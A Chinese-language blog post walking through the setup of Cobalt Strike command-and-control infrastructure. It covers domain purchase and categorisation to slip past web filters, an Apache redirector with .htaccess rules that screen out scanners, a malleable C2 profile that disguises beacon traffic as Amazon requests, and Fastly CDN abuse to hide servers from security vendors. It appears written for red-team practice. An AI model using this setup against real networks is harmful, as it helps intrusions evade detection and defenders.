<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>ShadowMccc&#39;s Blog</title>
  <meta name="author" content="ShadowMccc">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="ShadowMccc&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="ShadowMccc&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ShadowMccc&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>ShadowMccc&#39;s Blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		Beneath this mask there is more than fIesh.Beneath this mask there is an idea, Mr. Creedy.And ideas are bulletproof.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/12/20/C2基础设施搭建/" >C2基础设施搭建</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-12-20  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1><span id="购买域名">购买域名</span></h1><p>购买的域名可以是一个通用的域名，如”timeupdate.com”</p>
<p>强烈建议使用子域名，比如：</p>
<ul>
<li>sync.timeupdate.com</li>
</ul>
<h2><span id="注册域名通常只需要注册一年">注册域名（通常只需要注册一年）</span></h2><p>可以在不限于下面的三个平台去注册域名</p>
<ul>
<li><p>GoDaddy</p>
</li>
<li><p>NameCheap（支持btc充值）</p>
<p>如果你想用它进行钓鱼攻击，可以购买Office 365</p>
<p>购买WhoisGuard保护，以防止通过“whois”泄露信息（现在是免费的，会自动添加）</p>
</li>
</ul>
<p><img src="/images/78.png" alt="78"></p>
<ul>
<li>NameSilo（也支持btc）</li>
</ul>
<h1><span id="域名分类">域名分类</span></h1><p><strong>域名分类</strong>（Domain Categorization）是一种将域名按照特定标准进行分类的过程。通常，这种分类过程旨在识别和标记域名的用途、风险、合法性等方面。不同的分类标准可能根据域名的内容、所属的公司或服务、用途等因素进行划分。</p>
<p>在网络安全和反欺诈领域，域名分类通常是为了识别恶意或可疑的域名，防止它们被用于诈骗、网络钓鱼或其他恶意行为。例如，某些域名可能会被分类为“高风险”类别，而另一些则可能被分类为“合法”或“可信”类别。</p>
<h2><span id="域名分类的具体应用">域名分类的具体应用</span></h2><ol>
<li><strong>防止恶意域名重复使用</strong>：这是一个防御措施，通过自动化系统识别那些被恶意使用过的域名，并将它们分类为负面或“烧毁”类别，防止它们在未来被恶意重新注册或利用。</li>
<li><strong>风险管理</strong>：自动化的分类过程帮助域名注册商或管理机构识别可能与恶意活动相关的域名，帮助他们采取适当的安全措施。</li>
<li><strong>提高可信度</strong>：一些域名可能会被标记为“合法”或“正面”，这些域名的所有者可能会获得更多的信任，特别是在搜索引擎优化（SEO）和品牌保护方面。</li>
</ol>
<p>注意：一旦一个域名被标记为恶意之后就永远会带有恶意的标签，应该及时更换域名。</p>
<h2><span id="提交域名进行分类">提交域名进行分类</span></h2><ul>
<li>许多网页代理会阻止“未分类”域名</li>
<li>域名分类通常只需要几个小时</li>
</ul>
<table>
<thead>
<tr>
<th align="center">Blue Coat</th>
<th><a target="_blank" rel="noopener" href="https://sitereview.bluecoat.com/sitereview.jsp">https://sitereview.bluecoat.com/sitereview.jsp</a> (Symantec)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Zscalar</td>
<td><a target="_blank" rel="noopener" href="http://zulu.zscaler.com/">http://zulu.zscaler.com</a></td>
</tr>
<tr>
<td align="center">Forcepoint</td>
<td><a target="_blank" rel="noopener" href="https://support.forcepoint.com/s/site-lookup">https://support.forcepoint.com/s/site-lookup</a></td>
</tr>
<tr>
<td align="center">McAfee</td>
<td><a target="_blank" rel="noopener" href="https://trustedsource.org/en/feedback/url?action=checksingle&url=&product=00">https://trustedsource.org/en/feedback/url?action=checksingle&amp;url=&amp;product=00</a></td>
</tr>
<tr>
<td align="center">Barracuda</td>
<td><a target="_blank" rel="noopener" href="http://www.barracudacentral.org/lookups">http://www.barracudacentral.org/lookups</a></td>
</tr>
<tr>
<td align="center">Trend Micro</td>
<td><a target="_blank" rel="noopener" href="http://global.sitesafety.trendmicro.com/index.php">http://global.sitesafety.trendmicro.com/index.php</a></td>
</tr>
<tr>
<td align="center">Symantec</td>
<td><a target="_blank" rel="noopener" href="http://rulespace.com/swg-ratertool/tool.php">http://rulespace.com/swg-ratertool/tool.php</a> (down)</td>
</tr>
<tr>
<td align="center">Sophos</td>
<td><a target="_blank" rel="noopener" href="https://secure2.sophos.com/en-us/threat-center/reassessment-request.aspx">https://secure2.sophos.com/en-us/threat-center/reassessment-request.aspx</a></td>
</tr>
<tr>
<td align="center">Trustwave</td>
<td><a target="_blank" rel="noopener" href="https://support.trustwave.com/wfdbcheck.asp">https://support.trustwave.com/wfdbcheck.asp</a></td>
</tr>
<tr>
<td align="center">BrightCloud</td>
<td><a target="_blank" rel="noopener" href="http://www.brightcloud.com/tools/change-request-url-categorization.php">http://www.brightcloud.com/tools/change-request-url-categorization.php</a></td>
</tr>
<tr>
<td align="center">Check Point</td>
<td><a target="_blank" rel="noopener" href="https://usercenter.checkpoint.com/ucapps/urlcat/">https://usercenter.checkpoint.com/ucapps/urlcat/</a> (需要登录)</td>
</tr>
<tr>
<td align="center">Zvelo[Check a URL Category</td>
<td><a target="_blank" rel="noopener" href="https://tools.zvelo.com/">https://tools.zvelo.com/</a></td>
</tr>
<tr>
<td align="center">Palo Alto</td>
<td><a target="_blank" rel="noopener" href="https://urlfiltering.paloaltonetworks.com/">https://urlfiltering.paloaltonetworks.com/</a></td>
</tr>
<tr>
<td align="center">Forinet</td>
<td><a target="_blank" rel="noopener" href="http://fortiguard.com/webfilter">http://fortiguard.com/webfilter</a></td>
</tr>
</tbody></table>
<h2><span id="域名分类tips">域名分类Tips</span></h2><ul>
<li>如果您对基础域名进行分类，通常也会自动分类所有子域名。</li>
<li>您必须实际拥有一个相关的、非恶意的网站才能进行初步分类。不能只是一个空白页面。</li>
<li>最简单的办法，使用apache反向代理</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">	ProxyRequests Off</span><br><span class="line">	ProxyPreserveHost On</span><br><span class="line">	ProxyPass / http://google.com/</span><br><span class="line">	ProxyPassReverse / http://google.com/</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<h2><span id="其他选择购买过期的域名">其他选择（购买过期的域名）</span></h2><ul>
<li><p>优点：</p>
<p>具有域名历史</p>
<p>可能有良好的声誉</p>
<p>已分类，并且可能被安全软件信任</p>
</li>
<li><p>缺点：</p>
<p>无法控制域名的名称</p>
</li>
<li><p>自动化工具</p>
<p>CatMyFish - <a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/CatMyFish">https://github.com/Mr-Un1k0d3r/CatMyFish</a> （过时了）</p>
</li>
</ul>
<h1><span id="基础设施组件"><strong>基础设施组件</strong></span></h1><ul>
<li>C2 服务器（2-3 个Cobalt Strike TeamServer 服务器）</li>
<li>Redirector (or Domain Fronting 每个TeamServer至少一个)</li>
<li>有效载荷和文件托管（1-2 个服务器）</li>
<li>钓鱼服务器（1-2 个服务器）</li>
<li>总服务器数量：6 个或更多</li>
</ul>
<h1><span id="基础设施访问策略设置">基础设施访问策略设置</span></h1><h2><span id="teamserver服务器设置">TeamServer服务器设置</span></h2><p>仅与TeamServer服务器进行必要的通信：</p>
<ul>
<li>Beacon通信 （所有通信都来自Redirector）</li>
<li>Cobalt Strike 客户端（设置仅允许你的出口IP访问50050端口，也可以将50050改为其他端口，或者通过隧道进行访问）</li>
<li>SSH（设置仅允许你的出口IP访问22端口）</li>
<li>可能的代理跳板端口（设置仅允许你的出口IP访问）</li>
</ul>
<p>示例 iptables 规则，只允许来自Redirector的 HTTP(S) 通信：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 443 ! -s &#123;redirIP&#125; -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 ! -s &#123;redirIP&#125; -j DROP</span><br><span class="line">iptables -save</span><br></pre></td></tr></table></figure>

<p>如果使用的是像Azure、Amazon或者DigitalOcean这样的云服务器也可以通过安全组来控制</p>
<h2><span id="redirector服务器设置">Redirector服务器设置</span></h2><p> 仅与Redirector进行必要的通信：</p>
<ul>
<li>Beacon通信 （尽量设置仅允许从目标的出口IP来）</li>
<li>SSH（设置仅允许你的出口IP访问22端口）</li>
<li>通过UA头，URL或者其他的http头进行流量的过滤</li>
</ul>
<h1><span id="ip隐藏以cloudflare为例">IP隐藏（以cloudflare为例）</span></h1><p>首先在cloudflare上添加一个已经存在的域名</p>
<p><img src="/images/79.png" alt="79"></p>
<p>然后再DNS这一栏添加一个A记录和CNAME，A记录为域名指向VPS，cname为子域名</p>
<p><img src="/images/80.png" alt="80"></p>
<p>然后将Cloudflare的Nameserver填到之前买的域名的nameserver那里</p>
<p><img src="/images/81.png" alt="81"></p>
<p><img src="/images/82.png" alt="82"></p>
<p>等待域名解析到vps后就接着在SSL&#x2F;TLS的Origin Server项创建证书，记录下证书和私钥以备后面使用</p>
<p><img src="/images/83.png" alt="83"></p>
<p>接着在加密模式那里选择full</p>
<p><img src="/images/84.png" alt="84"></p>
<p>本来是可以用于域名隐藏的，但是现在已经不支持了</p>
<p><a target="_blank" rel="noopener" href="https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Erik%20Hunstad%20-%20Domain%20Fronting%20is%20Dead%20Long%20Live%20Domain%20Fronting.pdf">https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Erik%20Hunstad%20-%20Domain%20Fronting%20is%20Dead%20Long%20Live%20Domain%20Fronting.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/SixGenInc/Noctilucent?tab=readme-ov-file">https://github.com/SixGenInc/Noctilucent?tab=readme-ov-file</a></p>
<h1><span id="搭建apache-redirector">搭建Apache Redirector</span></h1><p>安装apache服务器，启用 Apache 的ssl，rewrite，proxy，proxy_http模块，启用 Apache 的 SSL 配置文件 default-ssl.conf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd</span><br><span class="line">yum install mod_ssl -y</span><br><span class="line"></span><br><span class="line">vim /etc/httpd/conf/httpd.conf</span><br><span class="line">LoadModule ssl_module modules/mod_ssl.so</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br><span class="line"></span><br><span class="line">systemctl reload httpd</span><br></pre></td></tr></table></figure>

<p>使用之前在CloudFlare生成的证书和私钥生成CS使用的证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -<span class="built_in">export</span> -<span class="keyword">in</span> service.pem -inkey service.key -out 123.com.p12 -name 123.online -passout pass:fuck1235</span><br><span class="line">keytool -importkeystore -deststorepass fuck1235 -destkeypass fuck1235 -destkeystore 123.com.store -srckeystore 123.p12 -srcstoretype PKCS12 -srcstorepass fuck1235 -<span class="built_in">alias</span> 123.com</span><br></pre></td></tr></table></figure>

<p>在&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ssl.conf中添加以下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enable SSL</span></span><br><span class="line">SSLEngine On</span><br><span class="line"><span class="comment"># Enable Proxy</span></span><br><span class="line">SSLProxyEngine On</span><br><span class="line"><span class="comment"># Trust Self-Signed Certificates generated by Cobalt Strike</span></span><br><span class="line">SSLProxyVerify none</span><br><span class="line">SSLProxyCheckPeerCN off</span><br><span class="line">SSLProxyCheckPeerName off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SSLCertificateFile      /cert/service.pem</span><br><span class="line">SSLCertificateKeyFile /cert/service.key</span><br></pre></td></tr></table></figure>

<p>访问网站，出现下面的情况就是成功了</p>
<p><img src="/images/85.png" alt="85"></p>
<p>接着修改&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf中的&lt;Directory &#x2F;var&#x2F;www&#x2F;html&gt;处为如下所示</p>
<p>允许该目录下的 <code>.htaccess</code> 文件覆盖配置，以便用户对特定目录进行自定义配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /var/www/html&gt;</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Options FollowSymLinks</span><br><span class="line">        Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<p>接着就是添加.htaccess文件，一个简单的.htaccess文件如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /var/www/html/.htaccess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line"></span><br><span class="line"># 不允许非浏览器访问</span><br><span class="line">RewriteCond %&#123;HTTP_USER_AGENT&#125; (curl|wget|python) [NC]</span><br><span class="line">RewriteRule ^.*$ https://time.is [R=302,L]</span><br><span class="line"># 限制URI访问</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; !^(/js/v1/*)</span><br><span class="line">RewriteRule .* https://time.is [R=302,L]</span><br><span class="line"># 限制UA头访问</span><br><span class="line">RewriteCond %&#123;HTTP_USER_AGENT&#125; !(CertUtil|Microsoft-CryptoAPI) [NC]</span><br><span class="line">RewriteRule ^.*$ https://time.is [R=302,L]</span><br><span class="line"># 基于请求IP重定向</span><br><span class="line">RewriteCond %&#123;HTTP:X-Forwarded-For&#125; !^192\.168\.121\.[0-9]&#123;1,3&#125;$ [NC]</span><br><span class="line">RewriteRule ^.*$ https://time.is [R=302,L]</span><br><span class="line"># 重定向到TeamServer</span><br><span class="line">RewriteRule ^.*$ https://172.16.2.1:8080%&#123;REQUEST_URI&#125; [P,L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>如果你的访问策略比较严格的话还需要通过iptables设置允许cloudFlare的ip访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m multiport --dports http,https -s $ip -j ACCEPT</span><br><span class="line">cloudflare的ip范围:</span><br><span class="line">https://www.cloudflare.com/zh-cn/ips/</span><br></pre></td></tr></table></figure>

<h1><span id="搭建teamserver">搭建TeamServer</span></h1><p>修改profile设置证书并匹配我们之前设置的规则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter    &quot;20&quot;;</span><br><span class="line"></span><br><span class="line">set data_jitter &quot;50&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set useragent &quot;Microsoft-CryptoAPI&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#custom cert</span><br><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;/123.com.store&quot;;</span><br><span class="line">    set password &quot;fuck123&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">    set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/js/v1/time.js&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token=&quot;;</span><br><span class="line">            prepend &quot;skin=noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;/js/v1/times.js&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe=ISO-8859-1;&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line">        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE=edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后启动teamserver查看是否可以上线</p>
<p><img src="/images/86.png" alt="86"></p>
<h1><span id="域前置以fastly为例">域前置（以fastly为例）</span></h1><p>工作原理：</p>
<ol>
<li><strong>请求目标</strong>：<ul>
<li>客户端向一个 <strong>内容分发网络（CDN）</strong> 提交请求。请求的目标是一个合法、公开的域名（例如 <code>google.com</code>）。通常这些域名在多数地方不会被封锁。</li>
</ul>
</li>
<li><strong>TLS 握手</strong>：<ul>
<li>客户端和 CDN 之间建立 <strong>TLS（传输层安全性）</strong> 连接。虽然客户端向一个合法的域名（如 <code>google.com</code>）发起请求，但在请求的 <strong><code>Host</code> 头部</strong>，它指定了实际的目标域名（例如 <code>blocked-site.com</code>），即目标网站是被审查的域名。</li>
</ul>
</li>
<li><strong>CDN 转发请求</strong>：<ul>
<li>由于 CDN 的边缘服务器会根据客户端请求中的 <strong>SNI（Server Name Indication）</strong> 信息来选择合适的 SSL 证书，它会将请求转发到目标服务器，即使目标域名被审查或封锁。CDN 仅基于 SNI 字段的域名进行 SSL 握手和路由，而实际的请求目标由 <code>Host</code> 头部提供。</li>
</ul>
</li>
<li><strong>加密通信</strong>：<ul>
<li>由于请求是通过 HTTPS 传输的，所有请求和响应都经过加密。这意味着客户端的真实请求和目标不会在传输过程中被审查或拦截。</li>
</ul>
</li>
<li><strong>响应返回</strong>：<ul>
<li>一旦目标服务器收到请求并处理它，数据就通过 CDN 返回给客户端，客户端看到的响应是从合法的 CDN 域名返回的，而实际的数据来自被封锁的目标网站。</li>
</ul>
</li>
</ol>
<p>很遗憾，在2024 年 2 月 27 日fastly通过强制验证 TLS 证书的 SAN 条目与 HTTP 请求的主机标头中的主机名之间的关联的技术（Certificate Pinning）ban了域前置(azure在今年前几个月还可以，或者用CDN77?)，但是我们还是可以生成域名滥用其CDN服务。</p>
<p><a target="_blank" rel="noopener" href="https://archive.torproject.org/websites/lists.torproject.org/pipermail/anti-censorship-team/2023-October/000328.html">https://archive.torproject.org/websites/lists.torproject.org/pipermail/anti-censorship-team/2023-October/000328.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.fastly.com/documentation/guides/concepts/errors/#error-421-misdirected-request">https://www.fastly.com/documentation/guides/concepts/errors/#error-421-misdirected-request</a></p>
<p><img src="/images/cdn.png" alt="CDN"></p>
<p>首先创建一个CDN服务</p>
<p><img src="/images/87.png" alt="87"></p>
<p>然后添加域名和源然后激活</p>
<p><img src="/images/88.png" alt="88"></p>
<p>接着Deactivate然后clone 编辑配置</p>
<p><img src="/images/89.png" alt="89"></p>
<p>然后在Origins点击编辑</p>
<p><img src="/images/90.png" alt="90"></p>
<p>设置启用TLS但是不验证签名，然后更新</p>
<p><img src="/images/91.png" alt="91"></p>
<p>接着在设置中找到缓存设置，设置直接pass不缓存</p>
<p><img src="/images/92.png" alt="92"></p>
<p><img src="/images/93.png" alt="93"></p>
<p>然后在请求设置中按照如下进行设置（Force TLS打开）</p>
<p><img src="/images/94.png" alt="94"></p>
<p>接着在header中按照如下进行设置</p>
<p><img src="/images/95.png" alt="95"></p>
<p>关闭ForceTLS and enable HSTS</p>
<p><img src="/images/96.png" alt="96"></p>
<p>修改之前设置的.htaccess文件，删除通过ip过滤的规则，不知道为什么x-forwarded-for没起作用，测试上线</p>
<p><img src="/images/97.png" alt="97"></p>
<p><img src="/images/98.png" alt="98"></p>
<p>更多可用的CDN：</p>
<p><a target="_blank" rel="noopener" href="https://arxiv.org/pdf/2310.17851v3">https://arxiv.org/pdf/2310.17851v3</a></p>
<h1><span id="在赛门铁克域名分类查看域名情况">在赛门铁克域名分类查看域名情况</span></h1><p>由于我们使用了302跳转，没有托管任何网页在网站上，并且域名时间很短也不是以.com结尾，所有赛门铁克的域名分类可能会将我们的域名认定为可疑的域名，如下：</p>
<p><img src="/images/99.png" alt="99"></p>
<p>但是如果我们提交fastly的域名的话就没有这个情况了（可以在一定情况下规避赛门铁克的联网阻断）：<br><img src="/images/100.png" alt="100"></p>

	
	</div>
  <a type="button" href="/2024/12/20/C2基础设施搭建/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2024/12/20/C2基础设施搭建/" ><i class="fa fa-file-o"></i>C2基础设施搭建</a>
      </li>
    
      <li>
        <a href="/2024/12/10/OffensiveWindows攻击平台搭建/" ><i class="fa fa-file-o"></i>OffensiveWindows攻击平台搭建</a>
      </li>
    
      <li>
        <a href="/2024/12/03/AD-NTLM Relay/" ><i class="fa fa-file-o"></i>AD-NTLM Relay</a>
      </li>
    
      <li>
        <a href="/2024/12/01/AD-滥用DACL/" ><i class="fa fa-file-o"></i>AD-滥用DACL</a>
      </li>
    
      <li>
